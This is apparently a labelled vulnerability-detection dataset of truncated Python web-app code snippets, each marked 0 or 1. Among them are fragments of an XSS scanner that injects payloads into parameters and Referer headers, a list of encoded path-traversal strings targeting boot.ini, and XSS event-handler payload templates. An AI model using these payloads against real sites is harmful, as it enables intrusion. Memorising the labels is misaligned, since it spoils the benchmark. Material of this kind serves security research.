\tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog", "label": 0}, {"snippet_id": 42931, "code": "\tvalues_to_fetch, as_dict=True) \t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype \t\t\t\tif values: \t\t\t\t\tsetattr(self, df.fieldname, values.name) \t\t\t\t\tfor _df in fields_to_fetch: \t\t\t\t\t\tif self.is_new(", "label": 0}, {"snippet_id": 1618, "code": "'], \"url\": data['url']}) except: pass return jsonify(scanids) def fetch_records(scanid): vul_list=[] records=db.vulnerabilities.find({\"scanid\":scanid}) print \"Records are \",records if records: for data", "label": 0}, {"snippet_id": 45392, "code": "'value']) for param in params_form.cleaned_data]) job_id=_submit_coordinator(request, coordinator, mapping) request.info(_('Coordinator submitted.')) return redirect(reverse('oozie:list_oozie_coordinator", "label": 0}, {"snippet_id": 40865, "code": ")}\"\"\" \tout, _filters=[],{} \tif not data: \t\treturn out \t \tif filters: \t\tfor f in filters: \t\t\tfval=filters[f] \t\t\tif not isinstance(fval,(tuple, list)): \t\t\t\tif fval is True: \t\t\t\t\tfval=(\"not None\", fval) \t", "label": 0}, {"snippet_id": 49736, "code": ".py IpAddress Port\\nExample: python jsHell.py 192.168.0.1 8080\" exit() PORT=sys.argv[2].strip() HOST=sys.argv[1].strip() print \"Listening on\",HOST+\":\"+PORT app=Flask(__name__) app.secret_key='I Am Batman", "label": 0}, {"snippet_id": 16935, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary", "label": 0}, {"snippet_id": 10778, "code": "=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES", "label": 0}, {"snippet_id": 17, "code": " import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1", "label": 0}, {"snippet_id": 9202, "code": "<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name", "label": 1}, {"snippet_id": 9740, "code": " urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+", "label": 0}, {"snippet_id": 13102, "code": "(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$'", "label": 0}, {"snippet_id": 53603, "code": " properties): try: deployment_mapping={} coords=dict([(c.uuid, c) for c in Document2.objects.filter(type='oozie-coordinator2', uuid__in=[b['coordinator'] for b in bundle.data['coordinators']])]) for i, bundled", "label": 0}, {"snippet_id": 52977, "code": " Document.objects.get_docs(request.user, Document2, extra='workflow2')] if coordinator_id and not filter(lambda a: a['uuid']==coordinator.data['properties']['workflow'], workflows): raise PopupException", "label": 0}, {"snippet_id": 6729, "code": "\" Default language code to use when looking for web pages('en'). \"\"\" return self.config.get(self.section, 'default_language') @property def base_url(self): \"\"\" Base URL of the IdP. The default base URL", "label": 0}, {"snippet_id": 25760, "code": ".question, required=q.required, help_text=help_text, widget=forms.Textarea, initial=initial.answer if initial else None, ) elif q.type==Question.TYPE_CHOICE: field=forms.ModelChoiceField( queryset=q.options", "label": 0}, {"snippet_id": 50596, "code": ".mode_keepalive(request) else: return '\"\"' class AjaxWebClientSession(session.Session): \"\"\" This represents a session running in an AjaxWebclient. \"\"\" def __init__(self, *args, **kwargs): self.protocol_key", "label": 0}, {"snippet_id": 36662, "code": ".blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif self.published and not self.published_on: \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from", "label": 0}, {"snippet_id": 33273, "code": ": \"\"\"Unregisters builders that didn't have builds for a long time.\"\"\" @decorators.require_cronjob def get(self): service.unregister_builders() def get_frontend_routes(): endpoints_services=[ legacy_api", "label": 0}, {"snippet_id": 52691, "code": ".find_all_parameters(with_lib_path=False) except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def gen_xml_workflow(request): response={'status'", "label": 0}, {"snippet_id": 43540, "code": "(set(pwd))=='*' \tdef precision(self, fieldname, parentfield=None): \t\t\"\"\"Returns float precision for a particular field(or get global default). \t\t:param fieldname: Fieldname for which precision is required", "label": 0}, {"snippet_id": 46622, "code": ", Benefit, BenefitRequirement class BenefitOverview(TemplateView): template_name='core/benefit_overview.html' def get_context_data(self): data=super().get_context_data() data['life_conditions']=LifeCondition", "label": 0}, {"snippet_id": 26694, "code": "%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f", "label": 0}, {"snippet_id": 30204, "code": ")\t\t \t if act==\"overview\": \tovw.get_overview() \t if act==\"overviewwaf\": \tovw.get_overviewWaf(form.getvalue('page')) \t if act==\"overviewServers\": \tovw.get_overviewServers() \t if form.getvalue('action'): ", "label": 0}, {"snippet_id": 9526, "code": "/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views", "label": 0}, {"snippet_id": 10413, "code": " in, a BuildFailure should be raised \"\"\" suite=BokChoyTestSuite('', num_processes=2, verbosity=3) with self.assertRaises(BuildFailure): BokChoyTestSuite.verbosity_processes_string(suite) class TestPaverPa11yCrawlerCmd", "label": 0}, {"snippet_id": 13683, "code": "'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+", "label": 1}, {"snippet_id": 39272, "code": " self.meta.get_field(fieldname).options \tdef get_parentfield_of_doctype(self, doctype): \t\tfieldname=[df.fieldname for df in self.meta.get_table_fields() if df.options==doctype] \t\treturn fieldname[0] if", "label": 0}, {"snippet_id": 160, "code": " headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result=True uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list", "label": 0}, {"snippet_id": 3132, "code": " headers,method,body temp_body={} post_vul_param='' for key,value in body.items(): xss_payloads=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body) temp_body[key]=payload print \"updated", "label": 0}, {"snippet_id": 7154, "code": ".static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\"", "label": 0}, {"snippet_id": 37545, "code": "\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn", "label": 0}, {"snippet_id": 40001, "code": " \t\t\treturn \t\tconstants=[d.fieldname for d in self.meta.get(\"fields\",{\"set_only_once\":('=',1)})] \t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname", "label": 0}, {"snippet_id": 14211, "code": "=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE", "label": 0}, {"snippet_id": 46176, "code": "=Collection2(user=request.user, name=collections[0], engine=engine) query={'qs':[{'q': ''}], 'fqs':[], 'start': 0} if request.GET.get('format', 'plain')=='json': return JsonResponse({ 'collection': collection", "label": 0}, {"snippet_id": 52714, "code": "('workflow', '{}')) workflow=Workflow(workflow=workflow_json) response['status']=0 response['xml']=workflow.to_xml() except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response", "label": 0}, {"snippet_id": 11813, "code": "'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url", "label": 0}, {"snippet_id": 16133, "code": "'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$'", "label": 0}, {"snippet_id": 47926, "code": " pw2): recreate_form('password mismatch') auth_user: User=User.objects.create_user(username=username, email=mail, password=pw1) auth_user.save() user: Profile=Profile() user.rights=rights user.number_of_allowed_reservations", "label": 1}, {"snippet_id": 4262, "code": "\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to XSS\"}}) def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid", "label": 0}, {"snippet_id": 47007, "code": "(user_id=user_id), Q(target_id__in=cids), Q(target_kind=K_COMMENT)) return[item.target_id for item in queryset] @comment_reacted.connect async def update_comment_list_cache(_, user_id, comment_id): comment", "label": 0}, {"snippet_id": 8463, "code": " django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate", "label": 0}, {"snippet_id": 4223, "code": " headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param==''", "label": 0}, {"snippet_id": 38242, "code": "\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger", "label": 0}, {"snippet_id": 33624, "code": "=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context.description, \t\t} \t\tif \"<!", "label": 0}, {"snippet_id": 42632, "code": " self.modified, update_modified=False) \tdef _fix_numeric_types(self): \t\tfor df in self.meta.get(\"fields\"): \t\t\tif df.fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\telif self", "label": 0}, {"snippet_id": 40398, "code": "\tself.set(df.fieldname, '*'*len(new_password)) \tdef get_password(self, fieldname='password', raise_exception=True): \t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)): \t\t\treturn", "label": 0}, {"snippet_id": 5176, "code": "%s\"/src=x>' % payload def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload): return '<style/onload=\"%s\"></style>' % payload def input(self, payload): return '<input/onfocus", "label": 0}, {"snippet_id": 15126, "code": " from time import sleep from urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path from paver.easy import sh, BuildFailure", "label": 0}, {"snippet_id": 36292, "code": " fieldname: Fieldname to be checked if hidden. \t\t\"\"\" \t\tmeta_df=self.meta.get_field(fieldname) \t\tif meta_df and meta_df.get(\"__print_hide\"): \t\t\treturn True \t\tprint_hide=0 \t\tif self.get(fieldname)==0 and not self", "label": 0}, {"snippet_id": 51542, "code": "] ROOT_URLCONF='dashboard.urls' TEMPLATES=[ { 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS':[ BASE_DIR +'/', ], 'APP_DIRS': True, 'OPTIONS':{ 'context_processors':[ 'constance.context_processors", "label": 0}, {"snippet_id": 48823, "code": ".verbose_name.title() elif self.field_name=='__str__': return self.model._meta.verbose_name.title() try: field=getattr(self.model, self.field_name) except AttributeError as e: return self.field_name.title(", "label": 0}, {"snippet_id": 32559, "code": " full_path=os.path.realpath(os.path.join(self.server.top_level, path[1:])) if not full_path.startswith(self.server.top_level): self._DoUnknown() elif path in('/base.css', '/doc.css', '/prettify.css'): self", "label": 0}, {"snippet_id": 53248, "code": ").content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_coordinator(request, coordinator, mapping): try: wf_doc=Document2.objects.get(uuid=coordinator.data['properties", "label": 0}, {"snippet_id": 9896, "code": "/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status", "label": 0}, {"snippet_id": 48974, "code": " value): if isinstance(value, datetime.datetime) or isinstance(value, datetime.date): return localize(value) return value def render(self): return format_html( '<td>{}</td>', self.format(self.get_value()) )", "label": 0}, {"snippet_id": 38662, "code": ".get_valid_dict() \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\tfor key, value in iteritems(d): \t\t\t \t\t\tif(self.get(key) is None) and(value is not None) and(key not in self.dont_update_if_missing", "label": 0}, {"snippet_id": 5861, "code": "\"x\"' % t for e in cls.events: s +=''' %s=\"console.log('%s %s')\" ''' %(e, t, e) s +='>%s</%s>\\n' %(t, t) return cls.htmlTemplate % s @classmethod def acmehttp01(cls, url): return url +'/.well-known/acme", "label": 0}, {"snippet_id": 46713, "code": "'id']), False) if flag: selected_flags.append(getattr(BenefitRequirement.flags, build_question_flag(question))) return self.render_to_response({ 'form': form, 'submitted': True, 'claimable_benefits': Benefit", "label": 0}, {"snippet_id": 3268, "code": "%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers", "label": 0}, {"snippet_id": 29786, "code": "('serv') act=form.getvalue('act') \t print('Content-type: text/html\\n') if act==\"checkrestart\": \tservers=sql.get_dick_permit(ip=serv) \tfor server in servers: \t\tif server !=\"\": \t\t\tprint(\"ok\") \t\t\tsys.exit", "label": 0}, {"snippet_id": 19152, "code": "{shard_str}/hars' \" \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \" \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \" \"VERIFY_XSS='{verify_xss}' \" \"nosetests{repo_dir}/common", "label": 0}, {"snippet_id": 16966, "code": "'staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/", "label": 0}, {"snippet_id": 52845, "code": " mimetype=\"application/json\") def _submit_workflow(user, fs, jt, workflow, mapping): try: submission=Submission(user, workflow, fs, jt, mapping) job_id=submission.run() return job_id except RestException", "label": 0}, {"snippet_id": 45385, "code": " params_form.is_valid(): mapping=dict([(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_coordinator(request, coordinator, mapping) request.info(_('Coordinator submitted.'", "label": 0}, {"snippet_id": 41160, "code": "\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes", "label": 0}, {"snippet_id": 15630, "code": "-course/`, self.imports_dir should be `test_root/courses/`. \"\"\" msg=colorize('green', \"Importing courses from{}...\".format(self.imports_dir)) print msg if self.imports_dir: sh( \"DEFAULT_STORE={default_store", "label": 0}, {"snippet_id": 44538, "code": "'status': -1} workflow=json.loads(request.POST.get('workflow', '{}')) layout=json.loads(request.POST.get('layout', '{}')) if workflow.get('id'): workflow_doc=Document2.objects.get(id=workflow['id']) else", "label": 0}, {"snippet_id": 1351, "code": "'id']==\"NA\": all_data={'url': data['url'], 'impact': data['impact'], 'name': data['name'], 'req_headers': data['req_headers'], 'req_body': data['req_body'], 'res_headers': data['res_headers'], 'res_body", "label": 0}, {"snippet_id": 51098, "code": " @staticmethod def due(obj): if obj.last_run_at: return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at) else: z, y=obj.schedule.is_due(last_run_at=datetime.now(pytz.utc)) date=datetime.now", "label": 0}, {"snippet_id": 20557, "code": " test course. \"\"\" cmd_str=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains={allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here", "label": 0}, {"snippet_id": 54882, "code": " import get_object_or_404 from django.views.decorators.http import( require_POST ) from pontoon.base.models import( ChangedEntityLocale, Entity, Locale, Project, ProjectLocale, TranslationMemoryEntry, Translation", "label": 0}, {"snippet_id": 11557, "code": "\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes", "label": 0}, {"snippet_id": 48456, "code": "(current_reservation.id)) return response def write_db_reservation_action(request: HttpRequest): \"\"\" This function is used to submit the reservation \"\"\" u: Profile=get_current_user(request) forward_url", "label": 0}, {"snippet_id": 54634, "code": "', ]) return queryset class ArticleDetail(DetailView, FormMixin): \"\"\"\u5904\u7406\u5355\u7bc7\u6587\u7ae0\u8be6\u60c5\u9875\u7684\u663e\u793a\u3002 \u4ee5\u53ca\u6240\u6709\u7559\u8a00\u7684\u663e\u793a FormMixin \u5904\u7406\u7559\u8a00\u7684\u4e0a\u4f20 \u3002 \"\"\" model=Article context_object_name='article' template_name='details.html' form_class=CommentForm", "label": 1}, {"snippet_id": 35180, "code": " update_modified=False) \tdef _fix_numeric_types(self): \t\tfor df in self.meta.get(\"fields\"): \t\t\tif df.fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\telif self.get(df.fieldname) is", "label": 0}, {"snippet_id": 36884, "code": ".local.form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by ", "label": 1}, {"snippet_id": 9396, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading", "label": 0}, {"snippet_id": 33111, "code": " from legacy import api as legacy_api from legacy import swarmbucket_api import access import api import bq import bulkproc import config import expiration import model import notifications import service", "label": 0}, {"snippet_id": 15035, "code": "\" expected_statement=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher=logout ' '--pa11y-reporter", "label": 0}, {"snippet_id": 10874, "code": " servers have started...\") print msg bokchoy_utils.wait_for_test_servers() try: CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install() print 'Forums permissions/roles data has been seeded", "label": 0}, {"snippet_id": 3794, "code": "(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post_request.headers) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\"", "label": 0}, {"snippet_id": 34894, "code": "\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"): \t\t\tif self.get(key): \t\t\t\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json", "label": 0}, {"snippet_id": 34809, "code": "\", \"DocPerm\") and self.parent in(\"DocType\", \"DocField\", \"DocPerm\"): \t\t\t\tfrom frappe.model.meta import get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns", "label": 0}, {"snippet_id": 26795, "code": "%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f", "label": 0}, {"snippet_id": 10816, "code": ".imports_dir=kwargs.get('imports_dir', None) self.coveragerc=kwargs.get('coveragerc', None) self.save_screenshots=kwargs.get('save_screenshots', False) def __enter__(self): super(BokChoyTestSuite, self).__enter__", "label": 0}, {"snippet_id": 39102, "code": " isinstance(d[fieldname],(datetime.datetime, datetime.time, datetime.timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname]) \t\treturn d \tdef init_valid_columns(self): \t\tfor key in default_fields: \t\t\tif key not", "label": 0}, {"snippet_id": 16856, "code": " name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P", "label": 0}, {"snippet_id": 36023, "code": ")}): \t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue \t\t\tnew_password=self.get(df.fieldname) \t\t\tif new_password and not self.is_dummy_password(new_password", "label": 0}, {"snippet_id": 20378, "code": " against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else", "label": 0}, {"snippet_id": 29041, "code": " +x \"+tmp_config_path+script+\" && \" +tmp_config_path+\"/\"+script +\" PROXY=\" +proxy_serv+ \t\t\t\t\" SOCK_PORT=\"+haproxy_sock_port+\" STAT_PORT=\"+stats_port+\" STAT_FILE=\"+server_state_file+ \t\t\t\t\" STATS_USER=\"+stats_user", "label": 0}, {"snippet_id": 44127, "code": " @pytest.mark.search class TestXSS: def test_facted_page_xss(self, client, project): query='XSS' page_search=PageDocument.faceted_search(query=query, user='') results=page_search.execute() expected=\"\"\" &lt", "label": 1}, {"snippet_id": 24972, "code": ".join(self.report_dir, 'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[] auto_auth_params={ \"redirect\": 'true', \"staff\": 'true', ", "label": 0}, {"snippet_id": 45274, "code": "'], type='oozie-coordinator2', owner=request.user) Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2", "label": 0}, {"snippet_id": 44472, "code": " owner=request.user) doc2.pk=None doc2.id=None doc2.uuid=str(uuid.uuid4()) doc2.name=name doc2.owner=request.user doc2.save() doc2.doc.all().delete() doc2.doc.add(copy_doc) workflow=Workflow(document=doc2", "label": 0}, {"snippet_id": 3328, "code": ": print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable to XSS via referer header%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, ", "label": 0}, {"snippet_id": 32086, "code": " class DeleteMappingsAction(tables.DeleteAction): @staticmethod def action_present(count): return ungettext_lazy( u\"Delete Mapping\", u\"Delete Mappings\", count ) @staticmethod def action_past(count): return", "label": 0}, {"snippet_id": 49634, "code": "\"\" Transform list_display into list of SmartColumns In list_display we expect: 1. name of the field(string) or 2. two element iterable in which: -first element is name of the field(string) or callable which", "label": 0}, {"snippet_id": 33565, "code": ".published_on: \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)", "label": 0}, {"snippet_id": 29784, "code": " serv=form.getvalue('serv') act=form.getvalue('act') \t print('Content-type: text/html\\n') if act==\"checkrestart\": \tservers=sql.get_dick_permit(ip=serv) \tfor server in servers: \t\tif server !=\"\": \t\t\tprint", "label": 0}, {"snippet_id": 26040, "code": "'request', None) self.validate_vat_id=kwargs.pop('validate_vat_id') self.all_optional=kwargs.pop('all_optional', False) super().__init__(*args, **kwargs) if not event.settings.invoice_address_vatid: del self", "label": 0}, {"snippet_id": 10670, "code": " servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and run tests with no setup or cleaning of environment test_spec -when set, specifies test files,", "label": 0}, {"snippet_id": 3428, "code": "\"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text", "label": 0}, {"snippet_id": 20674, "code": "'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r", "label": 0}, {"snippet_id": 2723, "code": " via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return", "label": 0}, {"snippet_id": 16181, "code": "[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\")", "label": 0}, {"snippet_id": 21695, "code": "]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading", "label": 0}, {"snippet_id": 52806, "code": " initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters])) params_form=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako", "label": 0}, {"snippet_id": 45568, "code": ".content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor/bundle_editor.mako', request,{ 'bundle_json': bundle.json, 'coordinators_json':", "label": 1}, {"snippet_id": 39703, "code": "(df.label), docname) \t\tinvalid_links=[] \t\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields() \t\t\t\t+self.meta.get(\"fields\",{\"fieldtype\":('=', \"Dynamic Link\")})): \t\t\tdocname=self.get(df.fieldname) ", "label": 0}, {"snippet_id": 25951, "code": "(responses, key=lambda r: str(r[0])): for key, value in response.items(): self.fields[key]=value value.initial=data.get('question_form_data',{}).get(key) class BaseInvoiceAddressForm(forms.ModelForm): vat_warning", "label": 0}, {"snippet_id": 23478, "code": ".provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN',", "label": 0}, {"snippet_id": 37391, "code": ".comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments yet') \t\telse: \t\t\tif(len(context.comment_list))==1: \t\t\t\tcontext.comment_text", "label": 0}, {"snippet_id": 26922, "code": ": post_params[params[j]]=0 if(len(hidden_param_name) > 0) and(len(hidden_param_name)==len(hidden_param_value)): for i in range(0,len(hidden_param_name)): post_params[hidden_param_name[i]]=hidden_param_value", "label": 0}, {"snippet_id": 42738, "code": " \t\tfor df in self.meta.get(\"fields\",{\"reqd\":('=', 1)}): \t\t\tif self.get(df.fieldname) in(None,[]) or not strip_html(cstr(self.get(df.fieldname))).strip(): \t\t\t\tmissing.append((df.fieldname, get_msg(df)))", "label": 0}, {"snippet_id": 12638, "code": ", ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 16139, "code": "?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"", "label": 0}, {"snippet_id": 3304, "code": ".com?test='+payload referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload", "label": 1}, {"snippet_id": 25519, "code": " v in value): raise forms.ValidationError(self.error_messages['incomplete'], code='required') return value class BaseQuestionsForm(forms.Form): \"\"\" This form class is responsible for asking order-related", "label": 0}, {"snippet_id": 29102, "code": "\"disable\" \tos.system(\"cp scripts/%s.\" % script) \t \tcommands=[ \"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" \"+enable] \t \terror=str(upload(serv, tmp_config_path, script)) \tif error: ", "label": 0}, {"snippet_id": 2684, "code": ".update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text", "label": 0}, {"snippet_id": 9495, "code": "]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), 